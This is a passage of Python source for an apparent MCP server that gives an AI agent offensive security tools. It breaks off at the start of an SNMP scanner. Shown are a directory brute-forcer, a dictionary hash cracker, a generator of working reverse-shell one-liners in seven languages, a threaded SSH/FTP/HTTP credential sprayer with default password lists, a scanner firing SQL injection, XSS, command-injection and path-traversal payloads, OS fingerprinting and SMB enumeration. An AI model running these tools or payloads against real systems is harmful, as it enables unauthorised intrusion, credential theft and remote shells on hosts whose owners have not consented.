        _probe_req.add_header("User-Agent", _UA)
        if auth_header:
            _probe_req.add_header("Authorization", auth_header)
        if cookies:
            _probe_req.add_header("Cookie", cookies)
        _probe_resp = urllib.request.urlopen(_probe_req, timeout=timeout)
        if _probe_resp.status == 200:
            _probe_body = _probe_resp.read(4096)
            _spa_baseline_hash = _hashlib.sha256(_probe_body).hexdigest()
            _spa_baseline_size = len(_probe_body)
    except Exception:
        pass

    def check_path(path):
        target = f"{url.rstrip('/')}/{path}"
        try:
            req = urllib.request.Request(target, method="GET")
            req.add_header("User-Agent", _UA)
            if auth_header:
                req.add_header("Authorization", auth_header)
            if cookies:
                req.add_header("Cookie", cookies)
            response = urllib.request.urlopen(req, timeout=timeout)
            body = response.read(10000)
            size = len(body)
            body_hash = _hashlib.sha256(body[:4096]).hexdigest()
            return path, response.status, size, body_hash
        except urllib.error.HTTPError as e:
            return path, e.code, 0, ""
        except Exception:
            return path, 0, 0, ""

    from concurrent.futures import ThreadPoolExecutor, as_completed as asc

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_path, p): p for p in paths}
        for f in asc(futures):
            path, status, size, body_hash = f.result()
            if status in show_codes:
                is_fp = (
                    status == 200
                    and _spa_baseline_hash is not None
                    and body_hash == _spa_baseline_hash
                )
                results.append({
                    "path": path,
                    "status": status,
                    "size": size,
                    "false_positive": is_fp,
                })

    results.sort(key=lambda x: (x["status"], x["path"]))

    real_results = [r for r in results if not r.get("false_positive")]
    fp_results = [r for r in results if r.get("false_positive")]

    lines = [
        f"Directory Brute-Force: {url}",
        f"Paths tested: {len(paths)}",
        "",
    ]

    if auth_header or cookies:
        lines.append(f"Auth: {'Authorization header set' if auth_header else ''}{'  Cookies set' if cookies else ''}".strip())
        lines.append("")

    if _eng_rps_note:
        lines.append(f"[Rate] {_eng_rps_note}")
        lines.append("")

    if discovery_notes:
        lines.append("Discovery sources:")
        for note in discovery_notes:
            lines.append(f"  + {note}")
        lines.append("")

    if _spa_baseline_hash is not None:
        lines.append(
            f"[NOTE] SPA/try_files fallback detected — paths returning the same "
            f"body as unknown routes are tagged [LIKELY_FP] and excluded from "
            f"CRITICAL FINDINGS. Verify manually before treating as exploitable."
        )
        lines.append("")

    if not results:
        lines.append("No interesting paths found.")
    else:
        by_status: dict = {}
        for r in results:
            by_status.setdefault(r["status"], []).append(r)

        status_labels = {
            200: "OK (Accessible)", 301: "Redirect", 302: "Redirect",
            401: "Unauthorized", 403: "Forbidden", 500: "Server Error",
        }

        for status in sorted(by_status.keys()):
            label = status_labels.get(status, f"Status {status}")
            lines.append(f"[{status}] {label}:")
            for r in sorted(by_status[status], key=lambda x: x["path"]):
                fp_tag = "  [LIKELY_FP]" if r.get("false_positive") else ""
                lines.append(f"  /{r['path']}  ({r['size']}B){fp_tag}")
            lines.append("")

        critical = [r for r in real_results if any(
            k in r["path"].lower()
            for k in [".env", ".git", "backup", "config", "admin",
                      "phpinfo", "wp-config", "database", "dump"]
        ) and r["status"] in (200, 403)]
        if critical:
            lines.append("CRITICAL FINDINGS:")
            for r in critical:
                lines.append(f"  [{r['status']}] /{r['path']}")

    if fp_results:
        lines.append(
            f"\n{len(fp_results)} path(s) flagged [LIKELY_FP] — "
            f"matched SPA fallback body; manual verification required."
        )
    lines.append(f"\n{len(results)} paths found ({len(real_results)} confirmed, {len(fp_results)} likely false positive)")

    result = "\n".join(lines)
    return _auto_save("dirbust", result,
                      {"url": url, "paths_tested": len(paths), "found": len(results)},
                      structured_data=results)


# ── Credential Tools ──


@mcp_server.tool()
def crack_hash(
    target_hash: str,
    use_rules: bool = False,
) -> str:
    """
    Attempt to crack a password hash using dictionary attack.

    Supports MD5, SHA1, SHA256, SHA512. Identifies the hash type
    automatically. Uses a built-in common password list.

    Args:
        target_hash: The hash string to crack
        use_rules: Apply mutation rules (capitalize, add numbers,
                   leet speak) to expand the wordlist
    """
    import hashlib
    import time

    h = target_hash.strip()
    length = len(h)
    if length == 32 and all(c in '0123456789abcdefABCDEF' for c in h):
        hash_type = "md5"
    elif length == 40 and all(c in '0123456789abcdefABCDEF' for c in h):
        hash_type = "sha1"
    elif length == 64 and all(c in '0123456789abcdefABCDEF' for c in h):
        hash_type = "sha256"
    elif length == 128 and all(c in '0123456789abcdefABCDEF' for c in h):
        hash_type = "sha512"
    else:
        return f"Unknown hash type (length {length}). Supported: MD5(32), SHA1(40), SHA256(64), SHA512(128)"

    hash_funcs = {
        "md5": hashlib.md5, "sha1": hashlib.sha1,
        "sha256": hashlib.sha256, "sha512": hashlib.sha512,
    }
    hash_func = hash_funcs[hash_type]

    words = [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "iloveyou", "master", "sunshine", "ashley",
        "bailey", "passw0rd", "shadow", "123123", "654321",
        "superman", "qazwsx", "michael", "football", "password1",
        "password123", "batman", "login", "welcome", "admin",
        "admin123", "root", "toor", "pass", "changeme",
        "default", "guest", "test", "test123", "temp",
        "temp123", "p@ssw0rd", "P@ssw0rd", "P@ssword1",
        "Summer2024", "Winter2024", "Spring2024", "Fall2024",
        "Summer2025", "Winter2025", "Spring2025", "Fall2025",
        "Company1", "Company123", "Welcome1", "Welcome123",
        "Qwerty123", "Password1!", "P@ssw0rd!", "Admin123!",
        "1234567890", "123456789", "000000", "1q2w3e4r",
        "1qaz2wsx", "qwer1234", "zaq1xsw2",
        "111111", "aaaaaa", "abcdef",
    ]

    candidates = []
    for word in words:
        candidates.append(word)
        if use_rules:
            candidates.append(word.capitalize())
            candidates.append(word.upper())
            for suffix in ["1", "12", "123", "!", "1!", "123!",
                           "2024", "2025", "2026", "@1", "#1"]:
                candidates.append(word + suffix)
                candidates.append(word.capitalize() + suffix)
            leet_map = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$"}
            leet = word
            for c, r in leet_map.items():
                leet = leet.replace(c, r)
            if leet != word:
                candidates.append(leet)

    candidates = list(set(candidates))
    target_lower = h.lower()
    start = time.time()

    for i, candidate in enumerate(candidates):
        hashed = hash_func(candidate.encode()).hexdigest()
        if hashed == target_lower:
            duration = time.time() - start
            result = (
                f"CRACKED!\n"
                f"Password:  {candidate}\n"
                f"Hash type: {hash_type}\n"
                f"Attempts:  {i + 1}\n"
                f"Time:      {duration:.2f}s"
            )
            return _auto_save("crack_hash", result,
                              {"hash_type": hash_type, "cracked": True},
                              structured_data={"cracked": True, "password": candidate,
                                               "hash_type": hash_type, "attempts": i + 1})

    duration = time.time() - start
    result = (
        f"Not cracked\n"
        f"Hash type: {hash_type}\n"
        f"Attempts:  {len(candidates)}\n"
        f"Time:      {duration:.2f}s\n"
        f"Try a larger wordlist or use the standalone hashcrack.py with --rules"
    )
    return _auto_save("crack_hash", result,
                      {"hash_type": hash_type, "cracked": False},
                      structured_data={"cracked": False, "password": None,
                                       "hash_type": hash_type, "attempts": len(candidates)})


@mcp_server.tool()
def identify_hash(hash_str: str) -> str:
    """
    Identify the type of a password hash.

    Args:
        hash_str: The hash string to identify
    """
    h = hash_str.strip()

    if h.startswith(("$2a$", "$2b$", "$2y$")):
        return f"bcrypt (adaptive, slow — designed for passwords)\nLength: {len(h)}"
    if h.startswith("$1$"):
        return f"MD5 crypt (Unix)\nLength: {len(h)}"
    if h.startswith("$5$"):
        return f"SHA-256 crypt (Unix)\nLength: {len(h)}"
    if h.startswith("$6$"):
        return f"SHA-512 crypt (Unix)\nLength: {len(h)}"

    length = len(h)
    is_hex = all(c in '0123456789abcdefABCDEF' for c in h)

    if is_hex:
        types = {
            32: "MD5 (or NTLM if Windows)",
            40: "SHA-1",
            64: "SHA-256",
            128: "SHA-512",
        }
        if length in types:
            return f"{types[length]}\nLength: {length} hex chars"

    return f"Unknown hash type\nLength: {length}\nHex: {is_hex}"


# ── Exploitation Tools ──


@mcp_server.tool()
def generate_reverse_shell(
    payload_type: str = "bash",
    lport: int = 4444,
) -> str:
    """
    Generate reverse shell payloads for different languages.

    Creates the command that would be run on a compromised target to
    connect back to your listener. Use with the standalone revshell.py
    handler.

    Args:
        payload_type: Language/tool for payload. Options: bash, python,
                      nc, php, ruby, perl, powershell, all
        lport: Your listener port (default 4444)
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lhost = s.getsockname()[0]
        s.close()
    except Exception:
        lhost = "YOUR_IP"

    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby": f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"
        ),
        "powershell": (
            f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding)"
            f".GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
            f"$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};"
            f"$c.Close()\""
        ),
    }

    lines = [f"Reverse Shell Payloads → {lhost}:{lport}", ""]

    if payload_type == "all":
        for name, payload in payloads.items():
            lines.append(f"[{name}]")
            lines.append(payload)
            lines.append("")
    elif payload_type in payloads:
        lines.append(f"[{payload_type}]")
        lines.append(payloads[payload_type])
    else:
        lines.append(f"Unknown type. Available: {', '.join(payloads.keys())}, all")

    lines.append(f"\nStart your listener: python3 revshell.py -p {lport}")

    return "\n".join(lines)


# ── Credential Spraying ──


@mcp_server.tool()
def credential_spray(
    service: str,
    target: str,
    username: str | None = None,
    password: str | None = None,
    port: int | None = None,
    spray_mode: bool = False,
    threads: int = 5,
    timeout: float = 5.0,
) -> str:
    """
    Attempt to brute-force or spray credentials against a service.

    Supports SSH, FTP, and HTTP Basic Auth. Uses built-in default
    credential lists if none specified.

    Args:
        service: Service type — "ssh", "ftp", or "http-basic"
        target: Target IP or URL
        username: Single username to try (uses defaults if not set)
        password: Single password to try (uses defaults if not set)
        port: Service port (auto-detected if not set)
        spray_mode: If True, try one password across all users (avoids lockouts)
        threads: Concurrent threads (default 5, keep low for SSH)
        timeout: Connection timeout in seconds
    """
    import ftplib
    import base64
    import urllib.request
    import urllib.error
    from concurrent.futures import ThreadPoolExecutor, as_completed as asc
    import time

    default_users = [
        "admin", "root", "user", "test", "guest", "administrator",
        "ubuntu", "deploy", "jenkins", "git", "ftp", "backup",
    ]
    default_passwords = [
        "", "password", "admin", "root", "123456", "changeme",
        "default", "letmein", "welcome", "password1", "password123",
        "admin123", "root123", "test", "test123", "p@ssw0rd",
        "P@ssword1", "Admin123!", "guest", "1234567890",
    ]

    users = [username] if username else default_users
    passwords = [password] if password else default_passwords
    default_ports = {"ssh": 22, "ftp": 21, "http-basic": 80}
    if port is None:
        port = default_ports.get(service, 22)

    found = []
    attempts = 0
    start = time.time()

    def try_ftp(u, p):
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=timeout)
            ftp.login(u, p)
            ftp.quit()
            return True
        except Exception:
            return False

    def try_http_basic(u, p):
        creds = base64.b64encode(f"{u}:{p}".encode()).decode()
        try:
            req = urllib.request.Request(target)
            req.add_header("Authorization", f"Basic {creds}")
            urllib.request.urlopen(req, timeout=timeout)
            return True
        except urllib.error.HTTPError as e:
            return e.code != 401
        except Exception:
            return False

    def try_ssh(u, p):
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target, port=port, username=u, password=p,
                           timeout=timeout, allow_agent=False, look_for_keys=False)
            client.close()
            return True
        except Exception:
            return False

    try_func = {"ssh": try_ssh, "ftp": try_ftp, "http-basic": try_http_basic}
    if service not in try_func:
        return f"Unknown service: {service}. Use: ssh, ftp, http-basic"
    func = try_func[service]

    if spray_mode:
        pairs = [(u, p) for p in passwords for u in users]
    else:
        pairs = [(u, p) for u in users for p in passwords]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        for u, p in pairs:
            futures[executor.submit(func, u, p)] = (u, p)

        for f in asc(futures):
            u, p = futures[f]
            attempts += 1
            if f.result():
                found.append({"user": u, "password": p})

    duration = time.time() - start

    lines = [
        f"Credential Spray: {service}://{target}:{port}",
        f"Attempts: {attempts}",
        f"Duration: {duration:.1f}s",
        "",
    ]

    if found:
        lines.append("VALID CREDENTIALS FOUND:")
        for cred in found:
            lines.append(f"  {cred['user']}:{cred['password']}")
    else:
        lines.append("No valid credentials found.")

    result = "\n".join(lines)
    return _auto_save("credential_spray", result,
                      {"service": service, "target": target, "port": port, "attempts": attempts},
                      structured_data=found)


# ── Vulnerability Scanning ──


@mcp_server.tool()
def vuln_scan(
    url: str,
    tests: str = "all",
    timeout: float = 10.0,
    auth_header: str | None = None,
    cookies: str | None = None,
) -> str:
    """
    Scan a web URL for common vulnerabilities: SQL injection, XSS,
    command injection, LFI, and security header issues.

    Provide a URL with parameters to test (e.g., http://target.com/page?id=1).
    Without parameters, only header checks are performed.

    Supports authenticated scanning via auth_header or cookies so protected
    routes can be tested after login.

    Args:
        url: Target URL, ideally with parameters to test
        tests: Comma-separated tests to run: sqli,xss,cmdi,lfi,headers,all
               (default: all)
        timeout: Request timeout in seconds
        auth_header: Authorization header value to send with every request
                     (e.g., "Bearer eyJ..." or "Basic dXNlcjpwYXNz").
                     Include the scheme prefix.
        cookies: Cookie string to send with every request
                 (e.g., "session=abc123; csrf=xyz"). Follows the HTTP
                 Cookie header format.
    """
    import urllib.request
    import urllib.error
    import urllib.parse
    import re

    test_list = [t.strip() for t in tests.split(",")]
    if "all" in test_list:
        test_list = ["sqli", "xss", "cmdi", "lfi", "headers"]

    all_findings = []

    def _fetch(u):
        import ssl as _ssl_mod

        def _do_fetch(ssl_ctx=None):
            req = urllib.request.Request(u)
            req.add_header("User-Agent", "Mozilla/5.0")
            if auth_header:
                req.add_header("Authorization", auth_header)
            if cookies:
                req.add_header("Cookie", cookies)
            if ssl_ctx is not None:
                https_handler = urllib.request.HTTPSHandler(context=ssl_ctx)
                opener = urllib.request.build_opener(https_handler)
                resp = opener.open(req, timeout=timeout)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="ignore")

        def _is_ssl_verify_error(exc: Exception) -> bool:
            """urllib wraps SSL errors in URLError; unwrap to check."""
            if isinstance(exc, urllib.error.URLError):
                return isinstance(exc.reason, _ssl_mod.SSLCertVerificationError)
            return isinstance(exc, _ssl_mod.SSLCertVerificationError)

        try:
            return _do_fetch()
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
            return e.code, dict(e.headers), body
        except Exception as exc:
            if _is_ssl_verify_error(exc):
                # Retry with CERT_NONE for self-signed / private-CA targets so
                # security header audits remain accurate.
                try:
                    ctx = _ssl_mod.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl_mod.CERT_NONE
                    return _do_fetch(ssl_ctx=ctx)
                except urllib.error.HTTPError as e:
                    body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
                    return e.code, dict(e.headers), body
                except Exception:
                    return 0, {}, ""
            return 0, {}, ""

    def _inject(u, param, payload):
        parsed = urllib.parse.urlparse(u)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if param not in params:
            return u
        params[param] = [payload]
        return urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(params, doseq=True)))

    if "headers" in test_list:
        _, headers, _ = _fetch(url)
        scheme = urllib.parse.urlparse(url).scheme.lower()
        is_https = scheme == "https"

        # HSTS is only meaningful on HTTPS; flagging it on plain HTTP
        # overstates risk for intentional HTTP-only fixtures and local targets.
        hsts_sev = "HIGH" if is_https else "INFORMATIONAL"
        hsts_note = "" if is_https else " (not applicable on plain HTTP; expected on HTTPS terminator)"

        # CSP is context-dependent — low risk for API-only or local targets.
        csp_sev = "HIGH" if is_https else "LOW"

        # sec_headers: header → (severity, note, wstg_ref, asvs_ref)
        # WSTG refs: https://owasp.org/www-project-web-security-testing-guide/
        # ASVS refs: https://owasp.org/www-project-application-security-verification-standard/
        sec_headers = {
            "Strict-Transport-Security": (hsts_sev, hsts_note, "WSTG-CONF-10", "ASVS-9.2.1"),
            "Content-Security-Policy":   (csp_sev,  "",        "WSTG-CONF-12", "ASVS-14.4.4"),
            "X-Frame-Options":           ("MEDIUM",  "",        "WSTG-CLNT-09", "ASVS-14.4.3"),
            "X-Content-Type-Options":    ("LOW",     "",        "WSTG-CONF-07", "ASVS-14.4.1"),
        }
        for h, (sev, note, wstg, asvs) in sec_headers.items():
            if h.lower() not in {k.lower() for k in headers}:
                all_findings.append(f"[{sev}] Missing {h}{note} [{wstg}][{asvs}]")

        server = headers.get("Server", "")
        if server:
            all_findings.append(f"[LOW] Server header discloses: {server} [WSTG-INFO-02][ASVS-14.3.3]")
        xpb = headers.get("X-Powered-By", "")
        if xpb:
            all_findings.append(f"[LOW] X-Powered-By discloses: {xpb} [WSTG-INFO-08][ASVS-14.3.3]")

    parsed = urllib.parse.urlparse(url)
    params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

    if not params:
        lines = [f"Vulnerability Scan: {url}", ""]
        if all_findings:
            lines.extend(all_findings)
        else:
            lines.append("No URL parameters found to test injection points.")
            lines.append("Provide a URL like: http://target.com/page?id=1")
        result = "\n".join(lines)
        return _auto_save("vuln_scan", result,
                          {"url": url, "tests": tests, "findings": len(all_findings)},
                          structured_data=all_findings)

    sqli_errors = [
        r"sql syntax", r"mysql", r"sqlite", r"postgresql",
        r"ORA-\d+", r"SQLSTATE", r"database error",
        r"Warning.*\Wmysqli?_", r"Warning.*\Wpg_",
    ]
    xss_payloads = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "{{7*7}}",
    ]
    cmdi_payloads = ["; id", "| id", "$(id)"]
    cmdi_indicators = [r"uid=\d+", r"root:.*:0:0:"]
    lfi_payloads = ["../../../etc/passwd", "....//....//....//etc/passwd"]

    for param in params:
        if "sqli" in test_list:
            for payload in ["'", "' OR '1'='1", "' UNION SELECT NULL--"]:
                test_url = _inject(url, param, payload)
                _, _, body = _fetch(test_url)
                for pat in sqli_errors:
                    m = re.search(pat, body, re.IGNORECASE)
                    if m:
                        all_findings.append(
                            f"[CRITICAL] SQL Injection in '{param}' "
                            f"— payload: {payload} — evidence: {m.group()} "
                            f"[WSTG-INPV-05][ASVS-5.3.4]")
                        break

        if "xss" in test_list:
            for payload in xss_payloads:
                test_url = _inject(url, param, payload)
                _, _, body = _fetch(test_url)
                if payload in body:
                    all_findings.append(
                        f"[HIGH] Reflected XSS in '{param}' — payload reflected unescaped [WSTG-CLNT-01][ASVS-5.3.3]")
                    break
                if payload == "{{7*7}}" and "49" in body:
                    all_findings.append(
                        f"[CRITICAL] Template Injection in '{param}' — {{{{7*7}}}} = 49 [WSTG-INPV-18][ASVS-5.2.5]")
                    break

        if "cmdi" in test_list:
            for payload in cmdi_payloads:
                test_url = _inject(url, param, payload)
                _, _, body = _fetch(test_url)
                for pat in cmdi_indicators:
                    if re.search(pat, body, re.IGNORECASE):
                        all_findings.append(
                            f"[CRITICAL] Command Injection in '{param}' — payload: {payload} [WSTG-INPV-12][ASVS-5.2.2]")
                        break

        if "lfi" in test_list:
            for payload in lfi_payloads:
                test_url = _inject(url, param, payload)
                _, _, body = _fetch(test_url)
                if re.search(r"root:.*:0:0:", body):
                    all_findings.append(
                        f"[CRITICAL] LFI in '{param}' — /etc/passwd readable [WSTG-INPV-07][ASVS-12.3.1]")
                    break

    lines = [
        f"Vulnerability Scan: {url}",
        f"Parameters tested: {', '.join(params)}",
        f"Tests run: {', '.join(test_list)}",
        "",
    ]

    if all_findings:
        for f in all_findings:
            lines.append(f"  {f}")
        lines.append(f"\n{len(all_findings)} findings total")
    else:
        lines.append("No vulnerabilities detected.")

    result = "\n".join(lines)
    return _auto_save("vuln_scan", result,
                      {"url": url, "tests": tests, "findings": len(all_findings)},
                      structured_data=all_findings)


# ── OS Fingerprinting ──


@mcp_server.tool()
def os_fingerprint(
    target: str,
    passive_only: bool = False,
    timeout: float = 3.0,
) -> str:
    """
    Identify the operating system of a remote host by analyzing TCP/IP
    stack behavior, ICMP responses, and service banners.

    Active mode (default) sends TCP SYN probes and ICMP packets (needs sudo).
    Passive mode only grabs service banners (no root needed).

    Args:
        target: Target IP address
        passive_only: If True, only grab banners (no raw packet probes)
        timeout: Timeout per probe in seconds
    """
    import re

    TTL_SIGS = {(0, 64): "Linux/Unix/macOS", (65, 128): "Windows", (129, 255): "Cisco/Network Device"}
    WINDOW_SIGS = {
        5840: "Linux 2.4/2.6", 8192: "Windows XP/2003", 65535: "Windows 7+/macOS",
        64240: "Linux 4.x/5.x", 29200: "Linux 3.x", 32768: "Cisco IOS",
    }

    candidates: dict[str, Any] = {}

    def vote(os_name, confidence, source):
        if os_name and os_name != "Unknown":
            candidates.setdefault(os_name, []).append({"c": confidence, "s": source})

    for port, service in [(22, "SSH"), (80, "HTTP"), (443, "HTTPS"), (8080, "HTTP-Alt")]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))

            if service == "SSH":
                banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
                s.close()
                if "Ubuntu" in banner: vote("Ubuntu Linux", 90, f"SSH: {banner[:60]}")
                elif "Debian" in banner: vote("Debian Linux", 90, f"SSH: {banner[:60]}")
                elif "OpenSSH_for_Windows" in banner: vote("Windows", 90, f"SSH: {banner[:60]}")
                elif "OpenSSH" in banner: vote("Linux/Unix", 75, f"SSH: {banner[:60]}")
            else:
                s.send(f"HEAD / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                resp = s.recv(4096).decode("utf-8", errors="ignore")
                s.close()
                for line in resp.split("\r\n"):
                    if line.lower().startswith("server:"):
                        server = line.split(":", 1)[1].strip()
                        if "IIS" in server: vote("Windows Server", 85, f"HTTP: {server}")
                        elif "Ubuntu" in server: vote("Ubuntu Linux", 85, f"HTTP: {server}")
                        elif "Debian" in server: vote("Debian Linux", 85, f"HTTP: {server}")
                        elif "Apache" in server: vote("Linux (likely)", 60, f"HTTP: {server}")
                        elif "nginx" in server: vote("Linux (likely)", 55, f"HTTP: {server}")
                        break
        except Exception:
            continue

    if not passive_only:
        for probe_port in [80, 443, 22, 8080, 21]:
            syn = IP(dst=target) / TCP(dport=probe_port, flags="S",
                options=[("MSS", 1460), ("SAckOK", b""), ("Timestamp", (12345, 0)),
                         ("NOP", None), ("WScale", 7)])
            syn_resp = sr1(syn, timeout=timeout)
            if syn_resp and syn_resp.haslayer(TCP):
                ttl = syn_resp[IP].ttl
                win = syn_resp[TCP].window
                for (lo, hi), name in TTL_SIGS.items():
                    if lo <= ttl <= hi:
                        vote(name, 60, f"TTL={ttl}")
                        break
                if win in WINDOW_SIGS:
                    vote(WINDOW_SIGS[win], 70, f"Window={win}")
                elif any(abs(win - k) < 1000 for k in WINDOW_SIGS):
                    closest = min(WINDOW_SIGS, key=lambda k: abs(k - win))
                    vote(WINDOW_SIGS[closest], 55, f"Window={win} (~{closest})")
                sr1(IP(dst=target) / TCP(dport=probe_port, sport=syn_resp[TCP].dport,
                    flags="R", seq=syn_resp[TCP].ack), timeout=1)
                break

        ping = IP(dst=target) / ICMP(type=8) / Raw(load=b"A" * 32)
        reply = sr1(ping, timeout=timeout)
        if reply and reply.haslayer(ICMP):
            for (lo, hi), name in TTL_SIGS.items():
                if lo <= reply[IP].ttl <= hi:
                    vote(name, 50, f"Ping TTL={reply[IP].ttl}")
                    break

    scored = {}
    for os_name, votes in candidates.items():
        total = sum(v["c"] for v in votes)
        sources = [v["s"] for v in votes]
        scored[os_name] = {"score": total, "sources": sources}
    scored = dict(sorted(scored.items(), key=lambda x: -x[1]["score"]))

    lines = [f"OS Fingerprint: {target}", f"Mode: {'Passive' if passive_only else 'Active'}", ""]
    if scored:
        for os_name, info in scored.items():
            lines.append(f"  {info['score']:>3}  {os_name}")
            for src in info["sources"]:
                lines.append(f"       └─ {src}")
        best = list(scored.keys())[0]
        lines.append(f"\nBest guess: {best} (score: {scored[best]['score']})")
    else:
        lines.append("Could not determine OS. Target may be firewalled.")

    result = "\n".join(lines)
    guesses = [{"os": name, "score": info["score"], "sources": info["sources"]}
               for name, info in scored.items()]
    return _auto_save("os_fingerprint", result,
                      {"target": target, "mode": "passive" if passive_only else "active"},
                      structured_data=guesses)


# ── SMB Enumeration ──


@mcp_server.tool()
def smb_enum(
    target: str,
    timeout: float = 5.0,
) -> str:
    """
    Enumerate SMB (Windows file sharing) on a target. Discovers shares,
    OS version, SMB version, signing config, and checks for known vulns.

    Args:
        target: Target IP address
        timeout: Connection timeout in seconds
    """
    import struct as st
    import subprocess

    lines = [f"SMB Enumeration: {target}", ""]

    smb_port = None
    for port in [445, 139]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((target, port)) == 0:
                smb_port = port
            s.close()
            if smb_port:
                break
        except Exception:
            pass

    if not smb_port:
        lines.append("SMB ports (445, 139) are not open.")
        return "\n".join(lines)

    lines.append(f"SMB open on port {smb_port}")

    SMB1_NEG = (
        b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
        b"\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x62\x00\x02"
        b"PC NETWORK PROGRAM 1.0\x00\x02LANMAN1.0\x00\x02"
        b"Windows for Workgroups 3.1a\x00\x02LM1.2X002\x00"
        b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target, smb_port))
        s.send(SMB1_NEG)
        resp = s.recv(4096)
        s.close()

        if resp[4:8] == b"\xff\x53\x4d\x42":
            lines.append("SMB Version: SMB1")
            lines.append("[HIGH] SMB1 enabled — vulnerable to EternalBlue (CVE-2017-0144)")
            if len(resp) > 39:
                signing = "Required" if resp[39] & 0x08 else "Optional"
                lines.append(f"Signing: {signing}")
                if signing == "Optional":
                    lines.append("[MEDIUM] SMB signing not required — relay attacks possible")
        elif resp[4:8] == b"\xfe\x53\x4d\x42":
            lines.append("SMB Version: SMB2/3")
            if len(resp) > 72:
                dialect = st.unpack_from("<H", resp, 72)[0]
                dialect_map = {0x0202: "2.0.2", 0x0210: "2.1", 0x0300: "3.0",
                               0x0302: "3.0.2", 0x0311: "3.1.1"}
                lines.append(f"Dialect: SMB {dialect_map.get(dialect, hex(dialect))}")
            if len(resp) > 70:
                signing = "Required" if st.unpack_from("<H", resp, 70)[0] & 0x02 else "Optional"
                lines.append(f"Signing: {signing}")
                if signing == "Optional":
                    lines.append("[MEDIUM] SMB signing not required — relay attacks possible")
    except Exception as e:
        lines.append(f"Negotiate failed: {e}")

    try:
        smb_proc = subprocess.run(
            ["smbclient", "-L", f"//{target}", "-N"],
            capture_output=True, text=True, timeout=int(timeout) + 5,
        )
        output = smb_proc.stdout + smb_proc.stderr

        if "Anonymous login successful" in output:
            lines.append("\n[HIGH] Anonymous/null session login allowed")

        shares = []
        in_shares = False
        for line in output.splitlines():
            line = line.strip()
            if "Sharename" in line and "Type" in line:
                in_shares = True
                continue
            if line.startswith("---"):
                continue
            if not line or "Reconnecting" in line:
                in_shares = False
                continue
            if in_shares:
                parts = line.split()
                if len(parts) >= 2:
                    shares.append({"name": parts[0], "type": parts[1],
                                   "comment": " ".join(parts[2:])})

        if shares:
            lines.append(f"\nShares ({len(shares)}):")
            for sh in shares:
                flag = ""
                if sh["name"].lower() in ["admin$", "c$", "ipc$"]:
                    flag = " (default admin)"
                elif not sh["name"].endswith("$"):
                    flag = " ← check access"
                lines.append(f"  {sh['name']:<25} {sh['type']:<8} {sh['comment']}{flag}")

    except FileNotFoundError:
        lines.append("\nsmbclient not installed — install with: brew install samba")
    except Exception:
        pass

    smb_result = "\n".join(lines)
    smb_data: dict[str, Any] = {"port": smb_port}
    try:
        smb_data["shares"] = shares
    except NameError:
        smb_data["shares"] = []
    return _auto_save("smb_enum", smb_result, {"target": target, "port": smb_port},
                      structured_data=smb_data)


# ── SNMP Scanning ──


@mcp_server.tool()
def snmp_scan(
    target: str,
    community: str = "public",
    brute_force: bool = False,
    walk: bool = False,
    timeout: float = 3.0,
) -> str:
    """
    Query a device via SNMP to extract system info, network config,
